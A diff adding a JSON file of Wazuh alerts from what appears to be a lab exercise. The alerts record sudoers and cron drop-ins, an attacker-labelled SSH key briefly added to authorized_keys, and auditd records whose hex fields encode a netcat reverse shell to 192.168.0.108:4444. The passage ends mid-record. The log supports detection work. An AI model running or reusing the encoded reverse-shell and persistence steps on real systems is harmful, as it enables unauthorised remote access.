@@ -1,0 +1,2100 @@
+[
+  {
+    "timestamp": "2026-11-02T22:49:34.980+0000",
+    "rule": {
+      "level": 5,
+      "description": "File added to the system.",
+      "id": "554",
+      "firedtimes": 1,
+      "mail": false,
+      "groups": [
+        "ossec",
+        "syscheck",
+        "syscheck_entry_added",
+        "syscheck_file"
+      ],
+      "pci_dss": [
+        "11.5"
+      ],
+      "gpg13": [
+        "4.11"
+      ],
+      "gdpr": [
+        "II_5.1.f"
+      ],
+      "hipaa": [
+        "164.312.c.1",
+        "164.312.c.2"
+      ],
+      "nist_800_53": [
+        "SI.7"
+      ],
+      "tsc": [
+        "PI1.4",
+        "PI1.5",
+        "CC6.1",
+        "CC6.8",
+        "CC7.2",
+        "CC7.3"
+      ]
+    },
+    "agent": {
+      "id": "001",
+      "name": "bastion",
+      "ip": "10.20.30.201"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793659774.17338853",
+    "full_log": "File '/etc/sudoers.d/99-book09-lab' added\nMode: realtime\n",
+    "syscheck": {
+      "path": "/etc/sudoers.d/99-book09-lab",
+      "mode": "realtime",
+      "size_after": "27",
+      "perm_after": "r--r-----",
+      "uid_after": "0",
+      "gid_after": "0",
+      "md5_after": "3dbc1d95f4d209475ed3a1abc8d3a241",
+      "sha1_after": "a256c0107e6ba0dc686dfb215d8249c6ae0b6ebf",
+      "sha256_after": "9ef063e2ea045c5d44801cc3f5f78fa717c3dea75aa94924f9185ec6907c9fe0",
+      "uname_after": "root",
+      "gname_after": "root",
+      "mtime_after": "2026-11-02T22:49:34",
+      "inode_after": 2360521,
+      "event": "added"
+    },
+    "decoder": {
+      "name": "syscheck_new_entry"
+    },
+    "location": "syscheck"
+  },
+  {
+    "timestamp": "2026-11-02T22:49:39.577+0000",
+    "rule": {
+      "level": 7,
+      "description": "Integrity checksum changed.",
+      "id": "550",
+      "mitre": {
+        "id": [
+          "T1565.001"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Stored Data Manipulation"
+        ]
+      },
+      "firedtimes": 2,
+      "mail": false,
+      "groups": [
+        "ossec",
+        "syscheck",
+        "syscheck_entry_modified",
+        "syscheck_file"
+      ],
+      "pci_dss": [
+        "11.5"
+      ],
+      "gpg13": [
+        "4.11"
+      ],
+      "gdpr": [
+        "II_5.1.f"
+      ],
+      "hipaa": [
+        "164.312.c.1",
+        "164.312.c.2"
+      ],
+      "nist_800_53": [
+        "SI.7"
+      ],
+      "tsc": [
+        "PI1.4",
+        "PI1.5",
+        "CC6.1",
+        "CC6.8",
+        "CC7.2",
+        "CC7.3"
+      ]
+    },
+    "agent": {
+      "id": "001",
+      "name": "bastion",
+      "ip": "10.20.30.201"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793659779.17455246",
+    "full_log": "File '/etc/sudoers.d/99-book09-lab' modified\nMode: realtime\nChanged attributes: size,mtime,md5,sha1,sha256\nSize changed from '27' to '44'\nOld modification time was: '1793659774', now it is '1793659779'\nOld md5sum was: '3dbc1d95f4d209475ed3a1abc8d3a241'\nNew md5sum is : '0b57c3e43ad8f1908da275e0ddcd935b'\nOld sha1sum was: 'a256c0107e6ba0dc686dfb215d8249c6ae0b6ebf'\nNew sha1sum is : '54a5560c5702b89794beeb967ad0996bc1fc9126'\nOld sha256sum was: '9ef063e2ea045c5d44801cc3f5f78fa717c3dea75aa94924f9185ec6907c9fe0'\nNew sha256sum is : '4d0dd6cbb0df05498088f3dc6fda73a4e44fd5e6fee77ab096b07d32fa4b7ac5'\n",
+    "syscheck": {
+      "path": "/etc/sudoers.d/99-book09-lab",
+      "mode": "realtime",
+      "size_before": "27",
+      "size_after": "44",
+      "perm_after": "r--r-----",
+      "uid_after": "0",
+      "gid_after": "0",
+      "md5_before": "3dbc1d95f4d209475ed3a1abc8d3a241",
+      "md5_after": "0b57c3e43ad8f1908da275e0ddcd935b",
+      "sha1_before": "a256c0107e6ba0dc686dfb215d8249c6ae0b6ebf",
+      "sha1_after": "54a5560c5702b89794beeb967ad0996bc1fc9126",
+      "sha256_before": "9ef063e2ea045c5d44801cc3f5f78fa717c3dea75aa94924f9185ec6907c9fe0",
+      "sha256_after": "4d0dd6cbb0df05498088f3dc6fda73a4e44fd5e6fee77ab096b07d32fa4b7ac5",
+      "uname_after": "root",
+      "gname_after": "root",
+      "mtime_before": "2026-11-02T22:49:34",
+      "mtime_after": "2026-11-02T22:49:39",
+      "inode_after": 2360521,
+      "diff": "1a2\n> # book09 checked\n",
+      "changed_attributes": [
+        "size",
+        "mtime",
+        "md5",
+        "sha1",
+        "sha256"
+      ],
+      "event": "modified"
+    },
+    "decoder": {
+      "name": "syscheck_integrity_changed"
+    },
+    "location": "syscheck"
+  },
+  {
+    "timestamp": "2026-11-02T22:49:43.973+0000",
+    "rule": {
+      "level": 7,
+      "description": "File deleted.",
+      "id": "553",
+      "mitre": {
+        "id": [
+          "T1070.004",
+          "T1485"
+        ],
+        "tactic": [
+          "Defense Evasion",
+          "Impact"
+        ],
+        "technique": [
+          "File Deletion",
+          "Data Destruction"
+        ]
+      },
+      "firedtimes": 1,
+      "mail": false,
+      "groups": [
+        "ossec",
+        "syscheck",
+        "syscheck_entry_deleted",
+        "syscheck_file"
+      ],
+      "pci_dss": [
+        "11.5"
+      ],
+      "gpg13": [
+        "4.11"
+      ],
+      "gdpr": [
+        "II_5.1.f"
+      ],
+      "hipaa": [
+        "164.312.c.1",
+        "164.312.c.2"
+      ],
+      "nist_800_53": [
+        "SI.7"
+      ],
+      "tsc": [
+        "PI1.4",
+        "PI1.5",
+        "CC6.1",
+        "CC6.8",
+        "CC7.2",
+        "CC7.3"
+      ]
+    },
+    "agent": {
+      "id": "001",
+      "name": "bastion",
+      "ip": "10.20.30.201"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793659783.17501018",
+    "full_log": "File '/etc/sudoers.d/99-book09-lab' deleted\nMode: realtime\n",
+    "syscheck": {
+      "path": "/etc/sudoers.d/99-book09-lab",
+      "mode": "realtime",
+      "size_after": "44",
+      "perm_after": "r--r-----",
+      "uid_after": "0",
+      "gid_after": "0",
+      "md5_after": "0b57c3e43ad8f1908da275e0ddcd935b",
+      "sha1_after": "54a5560c5702b89794beeb967ad0996bc1fc9126",
+      "sha256_after": "4d0dd6cbb0df05498088f3dc6fda73a4e44fd5e6fee77ab096b07d32fa4b7ac5",
+      "uname_after": "root",
+      "gname_after": "root",
+      "mtime_after": "2026-11-02T22:49:39",
+      "inode_after": 2360521,
+      "event": "deleted"
+    },
+    "decoder": {
+      "name": "syscheck_deleted"
+    },
+    "location": "syscheck"
+  },
+  {
+    "timestamp": "2026-11-02T22:50:21.252+0000",
+    "rule": {
+      "level": 7,
+      "description": "Integrity checksum changed.",
+      "id": "550",
+      "mitre": {
+        "id": [
+          "T1565.001"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Stored Data Manipulation"
+        ]
+      },
+      "firedtimes": 3,
+      "mail": false,
+      "groups": [
+        "ossec",
+        "syscheck",
+        "syscheck_entry_modified",
+        "syscheck_file"
+      ],
+      "pci_dss": [
+        "11.5"
+      ],
+      "gpg13": [
+        "4.11"
+      ],
+      "gdpr": [
+        "II_5.1.f"
+      ],
+      "hipaa": [
+        "164.312.c.1",
+        "164.312.c.2"
+      ],
+      "nist_800_53": [
+        "SI.7"
+      ],
+      "tsc": [
+        "PI1.4",
+        "PI1.5",
+        "CC6.1",
+        "CC6.8",
+        "CC7.2",
+        "CC7.3"
+      ]
+    },
+    "agent": {
+      "id": "001",
+      "name": "bastion",
+      "ip": "10.20.30.201"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793659821.17888758",
+    "full_log": "File '/home/ccc/.ssh/authorized_keys' modified\nMode: realtime\nChanged attributes: size,mtime,md5,sha1,sha256\nSize changed from '99' to '196'\nOld modification time was: '1793609546', now it is '1793659821'\nOld md5sum was: '7ced89b98f4c9c5451dbde6e126e990b'\nNew md5sum is : '6546c875c73169d2de7451280f65a877'\nOld sha1sum was: 'f20613f9ab71dafa00eab08eee6bf0221e9aef9b'\nNew sha1sum is : '573bf696fbf210263e1bf98d0980c606c742aaff'\nOld sha256sum was: 'bd0120b8a37a90bf87b05c2a7856bd3c76e50050799739c4a94a7cfc8b6421d1'\nNew sha256sum is : 'caac4e666843389b8cc2061090abe270249b883c996ad5b7f5ba5e8584c49892'\n",
+    "syscheck": {
+      "path": "/home/ccc/.ssh/authorized_keys",
+      "mode": "realtime",
+      "size_before": "99",
+      "size_after": "196",
+      "perm_after": "rw-------",
+      "uid_after": "1000",
+      "gid_after": "1000",
+      "md5_before": "7ced89b98f4c9c5451dbde6e126e990b",
+      "md5_after": "6546c875c73169d2de7451280f65a877",
+      "sha1_before": "f20613f9ab71dafa00eab08eee6bf0221e9aef9b",
+      "sha1_after": "573bf696fbf210263e1bf98d0980c606c742aaff",
+      "sha256_before": "bd0120b8a37a90bf87b05c2a7856bd3c76e50050799739c4a94a7cfc8b6421d1",
+      "sha256_after": "caac4e666843389b8cc2061090abe270249b883c996ad5b7f5ba5e8584c49892",
+      "uname_after": "ccc",
+      "gname_after": "ccc",
+      "mtime_before": "2026-11-02T08:52:26",
+      "mtime_after": "2026-11-02T22:50:21",
+      "inode_after": 2360520,
+      "diff": "1a2\n> ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILy1BIGPG5oXr/vnf7TNysKFj0skhn8U1qT9xHVTBFmu book09@attacker\n",
+      "changed_attributes": [
+        "size",
+        "mtime",
+        "md5",
+        "sha1",
+        "sha256"
+      ],
+      "event": "modified"
+    },
+    "decoder": {
+      "name": "syscheck_integrity_changed"
+    },
+    "location": "syscheck"
+  },
+  {
+    "timestamp": "2026-11-02T22:50:25.985+0000",
+    "rule": {
+      "level": 7,
+      "description": "Integrity checksum changed.",
+      "id": "550",
+      "mitre": {
+        "id": [
+          "T1565.001"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Stored Data Manipulation"
+        ]
+      },
+      "firedtimes": 4,
+      "mail": false,
+      "groups": [
+        "ossec",
+        "syscheck",
+        "syscheck_entry_modified",
+        "syscheck_file"
+      ],
+      "pci_dss": [
+        "11.5"
+      ],
+      "gpg13": [
+        "4.11"
+      ],
+      "gdpr": [
+        "II_5.1.f"
+      ],
+      "hipaa": [
+        "164.312.c.1",
+        "164.312.c.2"
+      ],
+      "nist_800_53": [
+        "SI.7"
+      ],
+      "tsc": [
+        "PI1.4",
+        "PI1.5",
+        "CC6.1",
+        "CC6.8",
+        "CC7.2",
+        "CC7.3"
+      ]
+    },
+    "agent": {
+      "id": "001",
+      "name": "bastion",
+      "ip": "10.20.30.201"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793659825.18022353",
+    "full_log": "File '/home/ccc/.ssh/authorized_keys' modified\nMode: realtime\nChanged attributes: size,mtime,md5,sha1,sha256\nSize changed from '196' to '99'\nOld modification time was: '1793659821', now it is '1793609546'\nOld md5sum was: '6546c875c73169d2de7451280f65a877'\nNew md5sum is : '7ced89b98f4c9c5451dbde6e126e990b'\nOld sha1sum was: '573bf696fbf210263e1bf98d0980c606c742aaff'\nNew sha1sum is : 'f20613f9ab71dafa00eab08eee6bf0221e9aef9b'\nOld sha256sum was: 'caac4e666843389b8cc2061090abe270249b883c996ad5b7f5ba5e8584c49892'\nNew sha256sum is : 'bd0120b8a37a90bf87b05c2a7856bd3c76e50050799739c4a94a7cfc8b6421d1'\n",
+    "syscheck": {
+      "path": "/home/ccc/.ssh/authorized_keys",
+      "mode": "realtime",
+      "size_before": "196",
+      "size_after": "99",
+      "perm_after": "rw-------",
+      "uid_after": "1000",
+      "gid_after": "1000",
+      "md5_before": "6546c875c73169d2de7451280f65a877",
+      "md5_after": "7ced89b98f4c9c5451dbde6e126e990b",
+      "sha1_before": "573bf696fbf210263e1bf98d0980c606c742aaff",
+      "sha1_after": "f20613f9ab71dafa00eab08eee6bf0221e9aef9b",
+      "sha256_before": "caac4e666843389b8cc2061090abe270249b883c996ad5b7f5ba5e8584c49892",
+      "sha256_after": "bd0120b8a37a90bf87b05c2a7856bd3c76e50050799739c4a94a7cfc8b6421d1",
+      "uname_after": "ccc",
+      "gname_after": "ccc",
+      "mtime_before": "2026-11-02T22:50:21",
+      "mtime_after": "2026-11-02T08:52:26",
+      "inode_after": 2360520,
+      "diff": "2d1\n< ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILy1BIGPG5oXr/vnf7TNysKFj0skhn8U1qT9xHVTBFmu book09@attacker\n",
+      "changed_attributes": [
+        "size",
+        "mtime",
+        "md5",
+        "sha1",
+        "sha256"
+      ],
+      "event": "modified"
+    },
+    "decoder": {
+      "name": "syscheck_integrity_changed"
+    },
+    "location": "syscheck"
+  },
+  {
+    "timestamp": "2026-11-02T22:50:27.428+0000",
+    "rule": {
+      "level": 3,
+      "description": "sshd: authentication success.",
+      "id": "5715",
+      "mitre": {
+        "id": [
+          "T1078",
+          "T1021"
+        ],
+        "tactic": [
+          "Defense Evasion",
+          "Persistence",
+          "Privilege Escalation",
+          "Initial Access",
+          "Lateral Movement"
+        ],
+        "technique": [
+          "Valid Accounts",
+          "Remote Services"
+        ]
+      },
+      "firedtimes": 13,
+      "mail": false,
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_success"
+      ],
+      "gdpr": [
+        "IV_32.2"
+      ],
+      "gpg13": [
+        "7.1",
+        "7.2"
+      ],
+      "hipaa": [
+        "164.312.b"
+      ],
+      "nist_800_53": [
+        "AU.14",
+        "AC.7"
+      ],
+      "pci_dss": [
+        "10.2.5"
+      ],
+      "tsc": [
+        "CC6.8",
+        "CC7.2",
+        "CC7.3"
+      ]
+    },
+    "agent": {
+      "id": "001",
+      "name": "bastion",
+      "ip": "10.20.30.201"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793659827.18287384",
+    "full_log": "Nov  3 07:50:25 bastion sshd[4555]: Accepted publickey for ccc from 192.168.0.108 port 45618 ssh2: ED25519 SHA256:FnGa4j0F4T/pcAKG5Q0tazJNKt5dPLvnhViF1lk0KA0",
+    "predecoder": {
+      "program_name": "sshd",
+      "timestamp": "Nov  3 07:50:25",
+      "hostname": "bastion"
+    },
+    "decoder": {
+      "parent": "sshd",
+      "name": "sshd"
+    },
+    "data": {
+      "srcip": "192.168.0.108",
+      "srcport": "45618",
+      "dstuser": "ccc"
+    },
+    "location": "/var/log/auth.log"
+  },
+  {
+    "timestamp": "2026-11-02T22:51:42.984+0000",
+    "rule": {
+      "level": 5,
+      "description": "File added to the system.",
+      "id": "554",
+      "firedtimes": 4,
+      "mail": false,
+      "groups": [
+        "ossec",
+        "syscheck",
+        "syscheck_entry_added",
+        "syscheck_file"
+      ],
+      "pci_dss": [
+        "11.5"
+      ],
+      "gpg13": [
+        "4.11"
+      ],
+      "gdpr": [
+        "II_5.1.f"
+      ],
+      "hipaa": [
+        "164.312.c.1",
+        "164.312.c.2"
+      ],
+      "nist_800_53": [
+        "SI.7"
+      ],
+      "tsc": [
+        "PI1.4",
+        "PI1.5",
+        "CC6.1",
+        "CC6.8",
+        "CC7.2",
+        "CC7.3"
+      ]
+    },
+    "agent": {
+      "id": "001",
+      "name": "bastion",
+      "ip": "10.20.30.201"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793659902.18662825",
+    "full_log": "File '/etc/cron.d/book09-lab' added\nMode: realtime\n",
+    "syscheck": {
+      "path": "/etc/cron.d/book09-lab",
+      "mode": "realtime",
+      "size_after": "90",
+      "perm_after": "rw-r--r--",
+      "uid_after": "0",
+      "gid_after": "0",
+      "md5_after": "fbb0b8b772b5ee76aceb3edd3579c54d",
+      "sha1_after": "0bdd0b79ca41a57e93571fcbd10769b6d6e25a06",
+      "sha256_after": "d84c41c8fe80d3750ae62f5c2a9968bbded323e57ef5179b5d2067451a5d854f",
+      "uname_after": "root",
+      "gname_after": "root",
+      "mtime_after": "2026-11-02T22:51:42",
+      "inode_after": 2621780,
+      "event": "added"
+    },
+    "decoder": {
+      "name": "syscheck_new_entry"
+    },
+    "location": "syscheck"
+  },
+  {
+    "timestamp": "2026-11-02T22:52:26.866+0000",
+    "rule": {
+      "level": 3,
+      "description": "Audit: Command: /usr/bin/timeout.",
+      "id": "80792",
+      "firedtimes": 968,
+      "mail": false,
+      "groups": [
+        "audit",
+        "audit_command"
+      ],
+      "gdpr": [
+        "IV_30.1.g"
+      ]
+    },
+    "agent": {
+      "id": "006",
+      "name": "kt66-host",
+      "ip": "10.20.32.254"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793659946.18946382",
+    "full_log": "type=SYSCALL msg=audit(1793659946.206:6624): arch=c000003e syscall=59 success=no exit=-2 a0=7ffe0fe15340 a1=7ffe0fe15718 a2=7ffe0fe15738 a3=8 items=1 ppid=172434 pid=172435 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=82 comm=\"timeout\" exe=\"/usr/bin/timeout\" subj=unconfined key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"ccc\" UID=\"ccc\" GID=\"ccc\" EUID=\"ccc\" SUID=\"ccc\" FSUID=\"ccc\" EGID=\"ccc\" SGID=\"ccc\" FSGID=\"ccc\" type=CWD msg=audit(1793659946.206:6624): cwd=\"/home/ccc\" type=PATH msg=audit(1793659946.206:6624): item=0 name=\"/usr/local/sbin/bash\" nametype=UNKNOWN cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0 type=PROCTITLE msg=audit(1793659946.206:6624): proctitle=74696D656F7574003335730062617368002D6300636174202F746D702F626F6F6B30392E6669666F207C2062617368202D6920323E2631207C206E63202D4E203139322E3136382E302E3130382034343434203E202F746D702F626F6F6B30392E6669666F",
+    "decoder": {
+      "parent": "auditd",
+      "name": "auditd"
+    },
+    "data": {
+      "audit": {
+        "type": "SYSCALL",
+        "id": "6624",
+        "arch": "c000003e",
+        "syscall": "59",
+        "success": "no",
+        "exit": "-2",
+        "ppid": "172434",
+        "pid": "172435",
+        "auid": "1000",
+        "uid": "1000",
+        "gid": "1000",
+        "euid": "1000",
+        "suid": "1000",
+        "fsuid": "1000",
+        "egid": "1000",
+        "sgid": "1000",
+        "fsgid": "1000",
+        "tty": "(none)",
+        "session": "82",
+        "command": "timeout",
+        "exe": "/usr/bin/timeout",
+        "key": "audit-wazuh-c",
+        "cwd": "/home/ccc"
+      }
+    },
+    "location": "/var/log/audit/audit.log"
+  },
+  {
+    "timestamp": "2026-11-02T22:52:26.868+0000",
+    "rule": {
+      "level": 3,
+      "description": "Audit: Command: /usr/bin/timeout.",
+      "id": "80792",
+      "firedtimes": 969,
+      "mail": false,
+      "groups": [
+        "audit",
+        "audit_command"
+      ],
+      "gdpr": [
+        "IV_30.1.g"
+      ]
+    },
+    "agent": {
+      "id": "006",
+      "name": "kt66-host",
+      "ip": "10.20.32.254"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793659946.18947949",
+    "full_log": "type=SYSCALL msg=audit(1793659946.206:6625): arch=c000003e syscall=59 success=no exit=-2 a0=7ffe0fe15340 a1=7ffe0fe15718 a2=7ffe0fe15738 a3=8 items=1 ppid=172434 pid=172435 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=82 comm=\"timeout\" exe=\"/usr/bin/timeout\" subj=unconfined key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"ccc\" UID=\"ccc\" GID=\"ccc\" EUID=\"ccc\" SUID=\"ccc\" FSUID=\"ccc\" EGID=\"ccc\" SGID=\"ccc\" FSGID=\"ccc\" type=CWD msg=audit(1793659946.206:6625): cwd=\"/home/ccc\" type=PATH msg=audit(1793659946.206:6625): item=0 name=\"/usr/local/bin/bash\" nametype=UNKNOWN cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0 type=PROCTITLE msg=audit(1793659946.206:6625): proctitle=74696D656F7574003335730062617368002D6300636174202F746D702F626F6F6B30392E6669666F207C2062617368202D6920323E2631207C206E63202D4E203139322E3136382E302E3130382034343434203E202F746D702F626F6F6B30392E6669666F",
+    "decoder": {
+      "parent": "auditd",
+      "name": "auditd"
+    },
+    "data": {
+      "audit": {
+        "type": "SYSCALL",
+        "id": "6625",
+        "arch": "c000003e",
+        "syscall": "59",
+        "success": "no",
+        "exit": "-2",
+        "ppid": "172434",
+        "pid": "172435",
+        "auid": "1000",
+        "uid": "1000",
+        "gid": "1000",
+        "euid": "1000",
+        "suid": "1000",
+        "fsuid": "1000",
+        "egid": "1000",
+        "sgid": "1000",
+        "fsgid": "1000",
+        "tty": "(none)",
+        "session": "82",
+        "command": "timeout",
+        "exe": "/usr/bin/timeout",
+        "key": "audit-wazuh-c",
+        "cwd": "/home/ccc"
+      }
+    },
+    "location": "/var/log/audit/audit.log"
+  },
+  {
+    "timestamp": "2026-11-02T22:52:26.875+0000",
+    "rule": {
+      "level": 3,
+      "description": "Audit: Command: /usr/bin/cat.",
+      "id": "80792",
+      "firedtimes": 970,
+      "mail": false,
+      "groups": [
+        "audit",
+        "audit_command"
+      ],
+      "gdpr": [
+        "IV_30.1.g"
+      ]
+    },
+    "agent": {
+      "id": "006",
+      "name": "kt66-host",
+      "ip": "10.20.32.254"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793659946.18949515",
+    "full_log": "type=SYSCALL msg=audit(1793659946.206:6628): arch=c000003e syscall=59 success=yes exit=0 a0=5591e79e82d0 a1=5591e79e5f60 a2=5591e79e5d80 a3=8 items=2 ppid=172435 pid=172436 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=82 comm=\"cat\" exe=\"/usr/bin/cat\" subj=unconfined key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"ccc\" UID=\"ccc\" GID=\"ccc\" EUID=\"ccc\" SUID=\"ccc\" FSUID=\"ccc\" EGID=\"ccc\" SGID=\"ccc\" FSGID=\"ccc\" type=EXECVE msg=audit(1793659946.206:6628): argc=2 a0=\"cat\" a1=\"/tmp/book09.fifo\" type=CWD msg=audit(1793659946.206:6628): cwd=\"/home/ccc\" type=PATH msg=audit(1793659946.206:6628): item=0 name=\"/usr/bin/cat\" inode=1442561 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PATH msg=audit(1793659946.206:6628): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=1451894 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PROCTITLE msg=audit(1793659946.206:6628): proctitle=636174002F746D702F626F6F6B30392E6669666F",
+    "decoder": {
+      "parent": "auditd",
+      "name": "auditd"
+    },
+    "data": {
+      "audit": {
+        "type": "SYSCALL",
+        "id": "6628",
+        "arch": "c000003e",
+        "syscall": "59",
+        "success": "yes",
+        "exit": "0",
+        "ppid": "172435",
+        "pid": "172436",
+        "auid": "1000",
+        "uid": "1000",
+        "gid": "1000",
+        "euid": "1000",
+        "suid": "1000",
+        "fsuid": "1000",
+        "egid": "1000",
+        "sgid": "1000",
+        "fsgid": "1000",
+        "tty": "(none)",
+        "session": "82",
+        "command": "cat",
+        "exe": "/usr/bin/cat",
+        "key": "audit-wazuh-c",
+        "execve": {
+          "a0": "cat",
+          "a1": "/tmp/book09.fifo"
+        },
+        "cwd": "/home/ccc",
+        "file": {
+          "name": "/usr/bin/cat",
+          "inode": "1442561",
+          "mode": "0100755"
+        }
+      }
+    },
+    "location": "/var/log/audit/audit.log"
+  },
+  {
+    "timestamp": "2026-11-02T22:52:26.875+0000",
+    "rule": {
+      "level": 3,
+      "description": "Audit: Command: /usr/bin/timeout.",
+      "id": "80792",
+      "firedtimes": 971,
+      "mail": false,
+      "groups": [
+        "audit",
+        "audit_command"
+      ],
+      "gdpr": [
+        "IV_30.1.g"
+      ]
+    },
+    "agent": {
+      "id": "006",
+      "name": "kt66-host",
+      "ip": "10.20.32.254"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793659946.18951433",
+    "full_log": "type=SYSCALL msg=audit(1793659946.206:6626): arch=c000003e syscall=59 success=no exit=-2 a0=7ffe0fe15340 a1=7ffe0fe15718 a2=7ffe0fe15738 a3=8 items=1 ppid=172434 pid=172435 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=82 comm=\"timeout\" exe=\"/usr/bin/timeout\" subj=unconfined key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"ccc\" UID=\"ccc\" GID=\"ccc\" EUID=\"ccc\" SUID=\"ccc\" FSUID=\"ccc\" EGID=\"ccc\" SGID=\"ccc\" FSGID=\"ccc\" type=CWD msg=audit(1793659946.206:6626): cwd=\"/home/ccc\" type=PATH msg=audit(1793659946.206:6626): item=0 name=\"/usr/sbin/bash\" nametype=UNKNOWN cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0 type=PROCTITLE msg=audit(1793659946.206:6626): proctitle=74696D656F7574003335730062617368002D6300636174202F746D702F626F6F6B30392E6669666F207C2062617368202D6920323E2631207C206E63202D4E203139322E3136382E302E3130382034343434203E202F746D702F626F6F6B30392E6669666F",
+    "decoder": {
+      "parent": "auditd",
+      "name": "auditd"
+    },
+    "data": {
+      "audit": {
+        "type": "SYSCALL",
+        "id": "6626",
+        "arch": "c000003e",
+        "syscall": "59",
+        "success": "no",
+        "exit": "-2",
+        "ppid": "172434",
+        "pid": "172435",
+        "auid": "1000",
+        "uid": "1000",
+        "gid": "1000",
+        "euid": "1000",
+        "suid": "1000",
+        "fsuid": "1000",
+        "egid": "1000",
+        "sgid": "1000",
+        "fsgid": "1000",
+        "tty": "(none)",
+        "session": "82",
+        "command": "timeout",
+        "exe": "/usr/bin/timeout",
+        "key": "audit-wazuh-c",
+        "cwd": "/home/ccc"
+      }
+    },
+    "location": "/var/log/audit/audit.log"
+  },
+  {
+    "timestamp": "2026-11-02T22:52:26.875+0000",
+    "rule": {
+      "level": 3,
+      "description": "Audit: Command: /usr/bin/bash.",
+      "id": "80792",
+      "firedtimes": 972,
+      "mail": false,
+      "groups": [
+        "audit",
+        "audit_command"
+      ],
+      "gdpr": [
+        "IV_30.1.g"
+      ]
+    },
+    "agent": {
+      "id": "006",
+      "name": "kt66-host",
+      "ip": "10.20.32.254"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1793659946.18952994",
+    "full_log": "type=SYSCALL msg=audit(1793659946.206:6627): arch=c000003e syscall=59 success=yes exit=0 a0=7ffe0fe15340 a1=7ffe0fe15718 a2=7ffe0fe15738 a3=8 items=2 ppid=172434 pid=172435 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=82 comm=\"bash\" exe=\"/usr/bin/bash\" subj=unconfined key=\"audit-wazuh-c\"\u001dARCH=x86_64 SYSCALL=execve AUID=\"ccc\" UID=\"ccc\" GID=\"ccc\" EUID=\"ccc\" SUID=\"ccc\" FSUID=\"ccc\" EGID=\"ccc\" SGID=\"ccc\" FSGID=\"ccc\" type=EXECVE msg=audit(1793659946.206:6627): argc=3 a0=\"bash\" a1=\"-c\" a2=636174202F746D702F626F6F6B30392E6669666F207C2062617368202D6920323E2631207C206E63202D4E203139322E3136382E302E3130382034343434203E202F746D702F626F6F6B30392E6669666F type=CWD msg=audit(1793659946.206:6627): cwd=\"/home/ccc\" type=PATH msg=audit(1793659946.206:6627): item=0 name=\"/usr/bin/bash\" inode=1442293 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PATH msg=audit(1793659946.206:6627): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=1451894 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\u001dOUID=\"root\" OGID=\"root\" type=PROCTITLE msg=audit(1793659946.206:6627): proctitle=74696D656F7574003335730062617368002D6300636174202F746D702F626F6F6B30392E6669666F207C2062617368202D6920323E2631207C206E63202D4E203139322E3136382E302E3130382034343434203E202F746D702F626F6F6B30392E6669666F",
+    "decoder": {
+      "parent": "auditd",
+      "name": "auditd"
+    },
+    "data": {
+      "audit": {
+        "type": "SYSCALL",
+        "id": "6627",
+        "arch": "c000003e",
+        "syscall": "59",
+        "success": "yes",
+        "exit": "0",
+        "ppid": "172434",
+        "pid": "172435",
+        "auid": "1000",
+        "uid": "1000",
+        "gid": "1000",
+        "euid": "1000",
+        "suid": "1000",
+        "fsuid": "1000",
+        "egid": "1000",
+        "sgid": "1000",
+        "fsgid": "1000",
+        "tty": "(none)",
+        "session": "82",
+        "command": "bash",
+        "exe": "/usr/bin/bash",
+        "key": "audit-wazuh-c",
+        "execve": {
+          "a0": "bash",
+          "a1": "-c"
+        },
